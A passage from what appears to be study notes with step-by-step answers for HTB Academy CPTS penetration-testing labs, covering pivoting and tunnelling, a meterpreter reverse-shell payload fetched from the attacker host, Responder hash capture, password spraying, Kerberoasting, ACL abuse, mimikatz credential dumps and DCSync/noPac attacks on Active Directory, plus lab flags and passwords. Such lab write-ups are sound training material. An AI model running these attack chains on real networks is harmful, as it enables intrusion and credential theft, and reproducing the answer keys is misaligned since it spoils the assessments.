\u201cOmit all symbol information from the output file\u201d or strip, and\u00a0`-w`\u00a0is \u201cOmit the DWARF symbol table\u201d).\ngo build -ldflags=\"-s -w\"\n\n# Copy the file to the target\nscp chisel ubuntu@$ip:~/\n\n# And connect to the machine\nssh ubuntu@$ip\n\n\n#########\n# In the Ubuntu compromised machine, our Pivot Host\n#######\n\n./chisel server -v -p 1234 --socks5\n\nsudo ./chisel server --reverse -v -p 1234 --socks5\n</code></pre> <p>SSH to\u00a0$ip\u00a0with user \"ubuntu\" and password \"HTB_@cademy_stdnt!\" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\\Users\\victor\\Documents\\flag.txt as the answer.</p> <p>Results: <code>Th3$eTunne1$@rent8oring!</code></p> <p>Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\\Users\\victor\\Downloads\\flag.txt as the answer.</p> <pre><code>#########\n# In the attacker machine\n#######\ngit clone https://github.com/utoni/ptunnel-ng.git\n\n# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh\nsudo ./autogen.sh \n\n# Another way to build the ptunnel-ng binary\nsudo apt install automake autoconf -y\ncd ptunnel-ng/\nsed -i '$s/.*/LDFLAGS=-static \"${NEW_WD}\\/configure\" --enable-static $@ \\&amp;\\&amp; make clean \\&amp;\\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh\n./autogen.sh\n\n# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host\nscp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/\n\n# Connect to the ubuntu\nssh ubuntu@$ipUbuntuCompromisedMachine\n</code></pre> <p>2. Start the ptunnel-ng Server on the Target Host</p> <pre><code>#########\n# In the Ubuntu compromised machine, our Pivot Host\n#######\nsudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22\n</code></pre> <p>3. With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).</p> <pre><code>#########\n# In the attacker machine\n#######\n\n# Connecting to ptunnel-ng Server from Attack Host\nsudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22\n</code></pre> <p>Now we can use proxychains with RDP to connect to the machine in the other network range:</p> <pre><code># First, enable Dynamic Port Forwarding over SSH\nssh -D 9050 -p2222 -lubuntu 127.0.0.1\n\n# Now we can use proxychains with nmap\nproxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19\n</code></pre> <p>Results: N3Tw0rkTunnelV1sion!</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#double-pivots","title":"Double Pivots","text":"<p>RDP to $ip with user \"htb-student\" and password \"HTB_@cademy_stdnt!\" Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.</p> <p>Our goal will be reaching the attacked machine 3. </p> <p>1. First, we download appropriate binaries to our kali attack host:</p> <ul> <li>SocksOverRDP x64 Binaries</li> <li>Proxifier Portable Binary</li> </ul> <p>2.  Attacking machine 1</p> <p>Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.</p> <p>From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. Do it as Admin</p> <pre><code>regsvr32.exe SocksOverRDP-Plugin.dll\n</code></pre> <p>3. Attacking machine 2</p> <p>Now, from the machine 1, we can connect to machine 2  over RDP using\u00a0<code>mstsc.exe</code>. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.</p> <p>4. Attacking machine 3</p> <p>Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.</p> <p>When done, start SocksOverRDP-Server.exe with Admin privileges in machine 2.</p> <p>When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.</p> <pre><code>netstat -antb | findstr 1080\n</code></pre> <p>Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. </p> <pre><code>Open proxifier and go to Profile &gt; Proxy server. Click on \"Add...\"\n</code></pre> <p>With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.</p> <p>So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.</p> <p>Results: H0pping@roundwithRDP!</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skill-assessments","title":"Skill assessments","text":"<p>A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a\u00a0<code>web shell</code>\u00a0in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are\u00a0<code>below</code>:</p> <p>Objectives</p> <ul> <li>Start from external (<code>Pwnbox or your own VM</code>) and access the first system via the web shell left in place.</li> <li>Use the web shell access to enumerate and pivot to an internal host.</li> <li>Continue enumeration and pivoting until you reach the\u00a0<code>Inlanefreight Domain Controller</code>\u00a0and capture the associated\u00a0<code>flag</code>.</li> <li>Use any\u00a0<code>data</code>,\u00a0<code>credentials</code>,\u00a0<code>scripts</code>, or other information within the environment to enable your pivoting attempts.</li> <li>Grab\u00a0<code>any/all</code>\u00a0flags that can be found.</li> </ul> <p>Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.</p> <pre><code># Enumerate $ip\nsudo nmap $ip\n# It will return port 80 and 22. Open a browser and go to http://$ip. It's a reverse shell. \ncd /home\nls -la\n# You will get two users. Have a look at webadmin. \nls -la /home/webadmin\n# You will get a id_rsa file. Copy it to your kali machine and use it to connect again via ssh as webadmin\nssh -i id_rsa webadmin@$ip\n</code></pre> <p>Results: webadmin</p> <p>Submit the credentials found in the user's home directory. (Format: user:password)</p> <pre><code>cat for-admin-eyes-only\n</code></pre> <p>Results: mlefay:Plain Human work!</p> <p>Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.</p> <pre><code>ip a\n\n# Now we do a ping sweep\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre> <p>Results: 172.16.5.35</p> <p>Use the information you gathered to pivot to the discovered host. Submit the contents of C:\\Flag.txt as the answer.</p> <pre><code>###########\n# I will use Module `Autoroute` in metasploit:\n############\n\n# Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.\n# 1. Create a payload for the Ubuntu Pivot Host (our victim's machine 1):\n\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080\n\n# 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.\nmsfconsole -q\nuse exploit/multi/handler\nset lhost 0.0.0.0\nset lport 8080\nset payload linux/x64/meterpreter/reverse_tcp\nrun\n\n# 3. Once created, kali machine, serve it with a python http server\npython3 -m http.server 8001\n\n# 4. Connect to the Ubuntu with the id_rsa and download the file\nssh -i id_rsa webadmin@ipUbuntu\nwget http://$ipKali:8001/backupjob\nchmod +x backupjob\n\n# 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali\n./backupjob\n\n# 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module\u00a0`socks_proxy`\u00a0to configure a local proxy on our attack host.\nuse auxiliary/server/socks_proxy\nset SRVPORT 9050\nset SRVHOST \nset version 4a\nrun\n# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.\n# Even though the command line has not returned anything you can ask for the jobs in execution with:\njobs\n\n# Make sure that your /etc/proxychains4.conf in your kali has enabled the line\nsocks4 127.0.0.1 9050\n# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.\n\n# 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.\nuse post/multi/manage/autoroute\nset SESSION 1\nset SUBNET $NewSubnet\n# Example: set SUBNET 172.16.5.0\nrun\n# This will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting\n\n# It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):\nsessions -i 1\nrun autoroute -s $NewDiscoveredIp/16\n\n# List the active routes:\nrun autoroute -p\n\n# 8. Make sure that you will get back the communications with a reverse proxy:\n\nssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000\n\n# 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.\nproxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:\"Plain Human work\\!\"\n</code></pre> <p>Results: S1ngl3-Piv07-3@sy-Day</p> <p>In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?</p> <pre><code># 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal\n.\\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     \n\n# You will see user vfrank and password\nvfrank:Imply wet Unmasked!\n</code></pre> <p>Results: vfrank</p> <p>For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\\Flag.txt located on the workstation.</p> <pre><code># 1. Open CMD and enumerate network interfaces\nipconfig /all\n\n# 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range\nfor /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find \"Reply\"\n# As a result now we have 172.16.6.25\n\n# Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:\n1..254 | % {\"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)\"}\n\n# 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!\n</code></pre> <p>Results: N3tw0rk-H0pp1ng-f0R-FuN</p> <p>Submit the contents of C:\\Flag.txt located on the Domain Controller.</p> <pre><code># 1. In the previously open session, open a windows explorer and notice the shared unit Z:\\\n</code></pre> <p>Results: 3nd-0xf-Th3-R@inbow!</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#active-directory-enumeration-attacks","title":"Active Directory Enumeration &amp; Attacks","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#initial-enumeration","title":"Initial Enumeration","text":"<p>While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{} )</p> <pre><code># Method 1\n# Go to https://viewdns.info/\n# Do a DNS Look up record for inlanefreight.com\n\n# Method 2\ndig TXT inlanefreight.com \n</code></pre> <p>Results: HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}</p> <p>SSH to  with user \"htb-student\" and password \"HTB_@cademy_stdnt!\" From your scans, what is the \"commonName\" of host 172.16.5.5 ?</p> <pre><code>ssh htb-student@$ip\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n\n# On discovered host 172.16.5.5, run a nmap aggressive\nnmap -A 172.16.5.5\n</code></pre> <p>Results: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</p> <p>What host is running \"Microsoft SQL Server 2019 15.00.2000.00\"? (IP address, not Resolved name)</p> <pre><code># FRom previous sweep ping we also had this ip 172.16.5.130. We run a nmap to verify\nnmap -A 172.16.5.130\n</code></pre> <p>Results: 172.16.5.130</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#sniffing-out-a-foothold","title":"Sniffing out a Foothold","text":"<p>Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.</p> <pre><code># One thing you can do is running kerbrute. For that previously in your kali machine\nsudo responder -I ens224 -A -wf\n</code></pre> <p>Results: backupagent</p> <p>Crack the hash for the previous account and submit the cleartext password as your answer.</p> <pre><code>echo \"backupagent::INLANEFREIGHT:a44a64f117fefgt; hash2\nhashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: h1backup55</p> <p>Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.</p> <pre><code>sudo responder -I ens224 -A -wf\necho \"wley::INLANEFREIGHT:59927891910ba43bgt; hash3\nhashcat -m 5600 hash3 /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: transporter@4</p> <p>RDP to\u00a0$ip (ACADEMY-EA-MS01)\u00a0with user \"htb-student\" and password \"Academy_student_AD!\" Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.</p> <pre><code>xfreerdp /v:$IP /u:htb-student /p:\"Academy_student_AD\\!\" /cert:ignore\n\n# Open Powershell as Administrator\ncd c:/tools\n.\\Inveigh.exe   \necho \"svc_qualys::INLANEFREIGHT:c64015117cfae8cfgt; hashsvc\nhashcat -m 5600 hashsvc /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: security#1</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#sighting-in-hunting-for-a-user","title":"Sighting In, Hunting For A User","text":"<p>SSH to  $ip with user \"htb-student\" and password \"HTB_@cademy_stdnt!\" What is the default Minimum password length when a new domain is created? (One number)</p> <pre><code># This information is included in the sylabus. It does not require us to run any command.\n</code></pre> <p>Results: 7</p> <p>What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)</p> <pre><code># Connect to the pivot machine\nssh htb-student@$ip\n\nip a\n\n# Sweep ping to discover IPs in the new the network range 172.16.5.X\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n\n# rpcclient via the\u00a0SMB NULL session technique:\nrpcclient -U \"\" -N 172.16.5.5\n\n# Now, within rpcclient terminal, enumerate domain password information\ngetdompwinfo\n</code></pre> <p>Results: 8</p> <p>Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?</p> <pre><code>sudo git clone https://github.com/ropnop/kerbrute.git\n\n# Typing make help will show us the compiling options available.\ncd kerbrute\nmake help\n\n# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).\nsudo make all\n\n# The newly created dist directory will contain our compiled binaries.\nls -la dist\n\ncd dist\npython3 -m http.server 8001\n\n# Connec to the pivot host\nssh htb-student@$ip\nwget http://$ipAttacker:8001 kerbrute_linux_amd64 \n\n# Also download the jsmith.txt from https://github.com/insidetrust/statistically-likely-usernames/tree/master \n\n# Run kerbrute from the pivot host\nkerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n</code></pre> <p>Results: 56 </p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#spray-responsibly","title":"Spray Responsibly","text":"<p>Find the user account starting with the letter \"s\" that has the password Welcome1. Submit the username as your answer.</p> <pre><code>./kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n\n./kerbrute_linux_386 passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1\n</code></pre> <p>Results: sgage</p> <p>RDP to $ip (ACADEMY-EA-MS01) with user \"htb-student\" and password \"Academy_student_AD!\". Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.</p> <pre><code># Open powershell as Admin\nImport-Module .\\DomainPasswordSpray.ps1 \n\nInvoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue \n</code></pre> <p>Results: dbranch</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#deeper-down-the-rabbit-hole","title":"Deeper Down the Rabbit Hole","text":"<p>What AD User has a RID equal to Decimal 1170?</p> <pre><code>ssh htb-student@$ip\nrpcclient -U forend 172.16.5.5\n# Enter password when prompted\n\n# In the console of developer tools:\nnumber=1170; number.toString(16);\n# We obtain 457 as the hex value for that user RID\n\nqueryuser 0x457\n</code></pre> <p>Results: mmorgan</p> <p>What is the membercount: of the \"Interns\" group?</p> <pre><code># Connect to the machine via ssh\nssh htb-student@$ip\n\n# ping sweet the network from than machine\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n\n# After determining the target 172.16.5.5, we can enumerate groups with provided creds, and filter by \"Interns\"\nsudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns\n</code></pre> <p>Results: 10</p> <p>RDP to\u00a010.129.147.147\u00a0(ACADEMY-EA-MS01)\u00a0with user \"htb-student\" and password \"Academy_student_AD!\". Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)</p> <p>For installing and using bloodhound.</p> <p></p> <p>Results: 13</p> <p>What PowerView function allows us to test if a user has administrative access to a local or remote host?</p> <p>Results: Test-AdminAccess</p> <p>Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?</p> <p>Results: sa</p> <p>What is the password for the database user?</p> <p>Results: ILFREIGHTDB01!</p> <p>RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user \"htb-student\" and password \"Academy_student_AD!\". Enumerate the host's security configuration information and provide its AMProductVersion.</p> <pre><code># To RDP \nxfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution\n\n# Get the current Defender status.\nGet-MpComputerStatus\n</code></pre> <p>Results: 4.18.2109.6  </p> <p>What domain user is explicitly listed as a member of the local Administrators group on the target host?</p> <pre><code># To RDP \nxfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution\n\n# Get members of Local Administrators group\nnet localgroup Administrators\n\n# In the results you will see:\nMembers                                                                    -----------------------------------                                        Administrator\nINLANEFREIGHT\\adunn\nINLANEFREIGHT\\Domain Admins\nINLANEFREIGHT\\Domain Users\nThe command completed successfully.\n</code></pre> <p>Results: adunn</p> <p>Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.</p> <pre><code># To RDP \nxfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution\n\n##########\n# With Get-AD \n##########\n# Lists disabled users with LDAP and returns their samAccountName\nGet-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select samaccountname\n\n# Gets details about one of the users obtained\nGet-ADUser -Identity bross -Properties * \n# Flag will be in the description field\n\n#########\n# With dsquery\n#########\n# Lists disabled users with LDAP and returns their samAccountName\ndsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))\" -attr SamAccountName    \n\n# Gets details about one of the users obtained\nnet user bross /domain \n</code></pre> <p>Results: HTB{LD@P_I$_W1ld}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#cooking-with-fire","title":"Cooking with Fire","text":"<p>SSH to\u00a0$ip (ACADEMY-EA-ATTACK01)\u00a0with user \"htb-student\" and password \"HTB_@cademy_stdnt!\". Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.</p> <pre><code># Connect via ssh\nssh htb-student@$ip\n\n# Enumerate the network\nfor i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n\n# Enumerate SPNs in the Domain and we will see SAPService among them\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n# When prompted for the password, enter Klmcargo2\n\n# Generate TGD ticket for the SAPService account\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile ker\n\n# Copy the ker file content to our kali attacker machine and crack it\nhashcat -m 13100 ker /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: !SapperFi2</p> <p>What powerful local group on the Domain Controller is the SAPService user a member of?</p> <pre><code>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n# When prompted for the password, enter Klmcargo2. You will also obtain the groups that the user belongs to.\n</code></pre> <p>Results: Account Operators</p> <p>What is the name of the service account with the SPN 'vmware/inlanefreight.local'?</p> <pre><code># Connect via rdp\nxfreerdp /v:$ip /u:$user /cert:ignore\n\n# List SPNs\nsetspn.exe -Q */*\n# And pay attention to the firsts in the list:\n# CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\n# vmware/inlanefreight.local  \n</code></pre> <p>Results: svc_vmwaresso</p> <p>Crack the password for this account and submit it as your answer.</p> <pre><code># Connect via rdp\nxfreerdp /v:$ip /u:$user /cert:ignore\n\n# Go to tools\ncd C:\\Tools\n\n# Import PowerView\nImport-module .\\PowerView.ps1\n\n# List SPNs and returns their SamAccountName\nGet-DomainUser * -spn | select samaccountname \n\n#  Generate a TGS ticker for a specific user:\nGet-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat\n\n# After copying the ticket to the kali machine and removing blank spaces, crack it with hashcat\ncat rc4_to_crack | tr -d \\\\n &gt; hash.txt\nhashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>Results: Virtual01</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#an-ace-in-the-hole","title":"An ACE in the Hole","text":"<p>What type of ACL defines which security principals are granted or denied access to an object? (one word) Results: DACL</p> <p>Which ACE entry can be leveraged to perform a targeted Kerberoasting attack? Results: GenericAll </p> <p>What is the rights GUID for User-Force-Change-Password? Results:</p> <p>What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration? Results: ResolveGUIDs</p> <p>What privileges does the user damundsen have over the Help Desk Level 1 group?</p> <p><pre><code>$sid2 = Convert-NameToSid damundsen\nGet-DomainObjectACL -Identity \"Help Desk Level 1\" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre> This can also be done with other tools such as Bloodhound, installed under C:\\Tools. Results: GenericWrite</p> <p>Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne).</p> <p><pre><code>$sid = Convert-NameToSid forend\n\nGet-DomainObjectACL -Identity \"dpayne\" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre> This can also be done with other tools such as Bloodhound, installed under C:\\Tools. Results: GenericAll</p> <p>What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)</p> <pre><code>$sid = Convert-NameToSid forend\n\nGet-DomainObjectACL -Identity \"GPO Management\" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Results: Self-Membership</p> <p>Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.</p> <p></p> <pre><code>##########\n# 1. Abuse ForceChangePassword: take over account damundsen\n#########\n\n# Wley will change the password of damundsen. First, open Powershell as Wley\n# Creating a PSCredential Object\n$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)\n</code></pre> <p></p> <p>Our user damundsen has GenericWrite privileges over the <code>Help Desk Level 1</code> group. This means, among other things, that the attacker can add a user/group/computer to a group.</p> <pre><code>##########\n# 2. Abuse GenericWrite: add damundsen to group 'Help Desk Level 1'\n#########\n# Open powershell as damundsen\n# Creating a SecureString Object using damundsen\n$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n\n# Add damundsen to the group\nAdd-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose\n\n# Confirming damundsen was Added to the Group\nGet-DomainGroupMember -Identity \"Help Desk Level 1\" | Select MemberName\n\n\n##########\n# 3. Abuse GenericAll: Perform a kerberoasting attack\n#########\n# Members of the\u00a0`Information Technology`\u00a0group have\u00a0`GenericAll`\u00a0rights over the user\u00a0`adunn`, which means we could perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak\n# Open powershell as damundsen\n# Creating a SecureString Object using damundsen\n$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force\n$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword) \n\n# Creating a Fake SPN\nSet-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\n#  Kerberoasting with Rubeus\n.\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n# Crack it\nhashcat -m 13100 $filename /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Results: SyncMaster757</p> <p>Perform a DCSync attack and look for another user with the option \"Store password using reversible encryption\" set. Submit the username as your answer.</p> <p><pre><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 \n</code></pre> Results: syncron</p> <p>What is this user's cleartext password? Results: Mycleart3xtP@ss!</p> <p>Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.</p> <pre><code># Open cmd \nrunas /netonly /user:INLANEFREIGHT\\adunn powershell\n# When prompted, enter password 'SyncMaster757'\n\ncd C:\\Tools\\mimikatz\\x64\n.\\mimikatz.exe\n\nlsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\khartsfield\n</code></pre> <p>Results: 4bb3b317845f0954200a6b0acc9b9f9a</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#stacking-the-deck","title":"Stacking The Deck","text":"<p>RDP to 10.129.230.228 (ACADEMY-EA-MS01) with user \"htb-student\" and password \"Academy_student_AD!\". What other user in the domain has CanPSRemote rights to a host?</p> <pre><code># Open Bloodhound\n# In Analysis tab, create a custom query and call it \"Find WinRM users\":\nMATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Results: bdavis</p> <p>What host can this user access via WinRM? (just the computer name) Results: ACADEMY-EA-DC01</p> <p>Authenticate to\u00a0ACADEMY-EA-DB01\u00a0with user \"damundsen\" and password \"SQL1234!\". Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\\Users\\damundsen\\Desktop\\flag.txt.</p> <pre><code>ssh htb-student@172.16.5.225\n\nmssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\n\nenable_xp_cmdshell\nxp_cmdshell type C:\\Users\\damundsen\\Desktop\\flag.txt\n</code></pre> <p>Results: 1m_the_sQl_@dm1n_n0w!</p> <p>Which two CVEs indicate NoPac.py may work? (Format: ####-#####&amp;####-#####, no spaces)</p> <p>Results: 2021-42278&amp;2021-42287</p> <p>Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.</p> <pre><code># Add this line to the proxychains file /etc/proxychains\nsocks5 127.0.0.1 1234\n\n# Establish a tunnel connection\nssh htb-student@$ip -D 1234\n\n# Now from my attacker machine, test the NoPac vulnerability. First we will run an scanner from the host machine:\nsudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n</code></pre> <p>It will return: </p> <pre><code># it will save the file administrator_ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.ccache\n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484\n[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663\n ```\n\nWe could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account:\n\n```bash\nsudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n</code></pre> <p>It will return:</p> <pre><code>[*] Using the DRSUAPI method to get NTDS.DIT secrets\ninlanefreight.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\ninlanefreight.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\ninlanefreight.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\ninlanefreight.local\\administrator:des-cbc-md5:70add6e02f70321f\n</code></pre> <p>whereas the NTLM hash is 88ad09182de639ccc6579eb0849751cf. Now we can use crackmapexec (for instance):</p> <pre><code>proxychains crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf  -x 'type C:\\Users\\Administrator\\Desktop\\DailyTasks\\flag.txt' --exec-method smbexec\n</code></pre> <p>Results: 